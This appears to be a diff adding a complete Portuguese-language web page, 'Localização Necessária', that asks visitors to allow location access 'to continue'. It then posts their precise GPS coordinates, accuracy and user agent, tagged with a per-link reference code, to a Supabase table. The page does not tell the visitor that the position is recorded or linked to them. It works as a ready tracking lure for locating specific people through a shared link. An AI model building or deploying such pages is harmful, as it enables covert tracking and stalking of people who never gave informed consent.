@@ -1,0 +1,719 @@
+```html
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+
+    <meta charset="UTF-8">
+
+    <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1.0"
+    >
+
+    <title>Localização Necessária</title>
+
+
+    <style>
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+
+        body {
+
+            min-height: 100vh;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            padding: 20px;
+
+            font-family:
+                Arial,
+                Helvetica,
+                sans-serif;
+
+            background: #f5f6f8;
+
+            color: #222;
+
+        }
+
+
+        .card {
+
+            width: 100%;
+
+            max-width: 420px;
+
+            background: #ffffff;
+
+            border-radius: 18px;
+
+            padding: 38px 28px;
+
+            text-align: center;
+
+            box-shadow:
+                0 10px 35px
+                rgba(0, 0, 0, 0.10);
+
+        }
+
+
+        .icon {
+
+            width: 72px;
+
+            height: 72px;
+
+            margin:
+                0 auto 22px;
+
+            border-radius: 50%;
+
+            display: flex;
+
+            align-items: center;
+
+            justify-content: center;
+
+            background: #f1f3f5;
+
+            font-size: 34px;
+
+        }
+
+
+        h1 {
+
+            font-size: 25px;
+
+            margin-bottom: 14px;
+
+            font-weight: 700;
+
+        }
+
+
+        .message {
+
+            font-size: 16px;
+
+            line-height: 1.5;
+
+            color: #555;
+
+            margin-bottom: 27px;
+
+        }
+
+
+        #locationButton {
+
+            width: 100%;
+
+            border: none;
+
+            border-radius: 10px;
+
+            padding: 16px 20px;
+
+            background: #111827;
+
+            color: #ffffff;
+
+            font-size: 16px;
+
+            font-weight: 600;
+
+            cursor: pointer;
+
+            transition: 0.2s;
+
+        }
+
+
+        #locationButton:hover {
+
+            opacity: 0.9;
+
+        }
+
+
+        #locationButton:active {
+
+            transform: scale(0.99);
+
+        }
+
+
+        #locationButton:disabled {
+
+            opacity: 0.6;
+
+            cursor: not-allowed;
+
+        }
+
+
+        #status {
+
+            min-height: 24px;
+
+            margin-top: 18px;
+
+            font-size: 14px;
+
+            line-height: 1.5;
+
+            color: #666;
+
+        }
+
+
+        .success {
+
+            color: #198754 !important;
+
+        }
+
+
+        .error {
+
+            color: #b42318 !important;
+
+        }
+
+    </style>
+
+</head>
+
+
+<body>
+
+
+    <main class="card">
+
+
+        <div class="icon">
+
+            📍
+
+        </div>
+
+
+        <h1>
+
+            Localização Necessária
+
+        </h1>
+
+
+        <p class="message">
+
+            Permitir localização para continuar.
+
+        </p>
+
+
+        <button
+            id="locationButton"
+            type="button"
+        >
+
+            Permitir Localização
+
+        </button>
+
+
+        <div
+            id="status"
+            aria-live="polite"
+        ></div>
+
+
+    </main>
+
+
+
+<script>
+
+
+/*
+===========================================================
+CONFIGURAÇÃO DO SUPABASE
+===========================================================
+*/
+
+
+const SUPABASE_URL =
+    "https://gotszlmzwkhyymtpnkwp.supabase.co";
+
+
+/*
+ * IMPORTANTE:
+ *
+ * Use SOMENTE a chave pública anon/publishable.
+ *
+ * NUNCA coloque aqui:
+ *
+ * service_role
+ * sb_secret_...
+ *
+ */
+
+
+const SUPABASE_KEY =
+    "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImdvdHN6bG16d2toeXltdHBua3dwIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODg5NTQ3NjYsImV4cCI6MjEwNDUzMDc2Nn0.HjF8uEBmPw-4rcLf8ZajIit1lhekrhNIvkXbjWEtftg";
+
+
+const SUPABASE_TABLE =
+    "localizacoes";
+
+
+
+/*
+===========================================================
+ELEMENTOS DA PÁGINA
+===========================================================
+*/
+
+
+const locationButton =
+    document.getElementById(
+        "locationButton"
+    );
+
+
+const status =
+    document.getElementById(
+        "status"
+    );
+
+
+
+/*
+===========================================================
+REFERÊNCIA DO LINK
+===========================================================
+*
+* Exemplo:
+*
+* https://seusite.vercel.app/?ref=cliente123
+*
+*/
+
+
+const urlParams =
+    new URLSearchParams(
+        window.location.search
+    );
+
+
+const referencia =
+    urlParams.get("ref") || null;
+
+
+
+/*
+===========================================================
+STATUS
+===========================================================
+*/
+
+
+function mostrarStatus(
+    mensagem,
+    tipo = ""
+) {
+
+    status.textContent =
+        mensagem;
+
+    status.className =
+        tipo;
+
+}
+
+
+
+/*
+===========================================================
+ENVIO PARA SUPABASE
+===========================================================
+*/
+
+
+async function salvarLocalizacao(
+    latitude,
+    longitude,
+    accuracy
+) {
+
+
+    const dados = {
+
+        referencia:
+            referencia,
+
+        latitude:
+            latitude,
+
+        longitude:
+            longitude,
+
+        precisao_metros:
+            typeof accuracy === "number"
+                ? accuracy
+                : null,
+
+        user_agent:
+            navigator.userAgent,
+
+        /*
+         * O IP NÃO é obtido pelo navegador.
+         *
+         * Portanto, nesta versão de arquivo único
+         * o IP não será preenchido automaticamente.
+         */
+
+        ip_address:
+            null,
+
+        capturado_em:
+            new Date().toISOString()
+
+    };
+
+
+    const resposta =
+        await fetch(
+
+            `${SUPABASE_URL}/rest/v1/${SUPABASE_TABLE}`,
+
+            {
+
+                method: "POST",
+
+                headers: {
+
+                    "Content-Type":
+                        "application/json",
+
+                    "apikey":
+                        SUPABASE_KEY,
+
+                    "Authorization":
+                        `Bearer ${SUPABASE_KEY}`,
+
+                    "Prefer":
+                        "return=minimal"
+
+                },
+
+                body:
+                    JSON.stringify(
+                        dados
+                    )
+
+            }
+
+        );
+
+
+    if (!resposta.ok) {
+
+        const erro =
+            await resposta.text();
+
+        console.error(
+            "Erro Supabase:",
+            erro
+        );
+
+        throw new Error(
+            "Erro ao salvar localização."
+        );
+
+    }
+
+
+    return true;
+
+}
+
+
+
+/*
+===========================================================
+SOLICITAR LOCALIZAÇÃO
+===========================================================
+*/
+
+
+function solicitarLocalizacao() {
+
+
+    /*
+     * Verifica suporte do navegador.
+     */
+
+    if (
+        !navigator.geolocation
+    ) {
+
+        mostrarStatus(
+            "Seu navegador não permite acesso à localização.",
+            "error"
+        );
+
+        return;
+
+    }
+
+
+    /*
+     * Desabilita enquanto processa.
+     */
+
+    locationButton.disabled =
+        true;
+
+
+    mostrarStatus(
+        "Solicitando sua localização..."
+    );
+
+
+
+    /*
+     * IMPORTANTE:
+     *
+     * getCurrentPosition()
+     * só é chamado depois do clique.
+     */
+
+    navigator.geolocation.getCurrentPosition(
+
+
+        /*
+        ===================================================
+        SUCESSO
+        ===================================================
+        */
+
+        async function(position) {
+
+
+            const latitude =
+                position.coords.latitude;
+
+
+            const longitude =
+                position.coords.longitude;
+
+
+            const accuracy =
+                position.coords.accuracy;
+
+
+
+            mostrarStatus(
+                "Localização autorizada. Processando..."
+            );
+
+
+
+            try {
+
+
+                await salvarLocalizacao(
+
+                    latitude,
+
+                    longitude,
+
+                    accuracy
+
+                );
+
+
+                mostrarStatus(
+
+                    "Localização registrada com sucesso.",
+
+                    "success"
+
+                );
+
+
+            } catch (erro) {
+
+
+                console.error(
+                    erro
+                );
+
+
+                mostrarStatus(
+
+                    "Não foi possível registrar a localização. Tente novamente.",
+
+                    "error"
+
+                );
+
+
+                locationButton.disabled =
+                    false;
+
+            }
+
+        },
+
+
+        /*
+        ===================================================
+        ERRO
+        ===================================================
+        */
+
+        function(error) {
+
+
+            locationButton.disabled =
+                false;
+
+
+
+            switch (
+                error.code
+            ) {
+
+
+                case
+                    error.PERMISSION_DENIED:
+
+
+                    mostrarStatus(
+
+                        "A localização é necessária. Permita o acesso à localização e tente novamente.",
+
+                        "error"
+
+                    );
+
+                    break;
+
+
+
+                case
+                    error.POSITION_UNAVAILABLE:
+
+
+                    mostrarStatus(
+
+                        "Não foi possível obter sua localização. Verifique o GPS ou a conexão e tente novamente.",
+
+                        "error"
+
+                    );
+
+                    break;
+
+
+
+                case
+                    error.TIMEOUT:
+
+
+                    mostrarStatus(
+
+                        "A localização demorou muito para responder. Tente novamente.",
+
+                        "error"
+
+                    );
+
+                    break;
+
+
+
+                default:
+
+
+                    mostrarStatus(
+
+                        "Não foi possível obter sua localização. Tente novamente.",
+
+                        "error"
+
+                    );
+
+            }
+
+        },
+
+
+        /*
+        ===================================================
+        CONFIGURAÇÕES
+        ===================================================
+        */
+
+        {
+
+            enableHighAccuracy:
+                true,
+
+            timeout:
+                30000,
+
+            maximumAge:
+                0
+
+        }
+
+    );
+
+}
+
+
+
+/*
+===========================================================
+EVENTO DO BOTÃO
+===========================================================
+*
+* A solicitação de localização NÃO acontece
+* automaticamente.
+*
+* Ela somente acontece quando o visitante
+* clica no botão.
+*/
+
+
+locationButton.addEventListener(
+
+    "click",
+
+    solicitarLocalizacao
+
+);
+
+
+</script>
+
+
+</body>
+
+</html>
+```
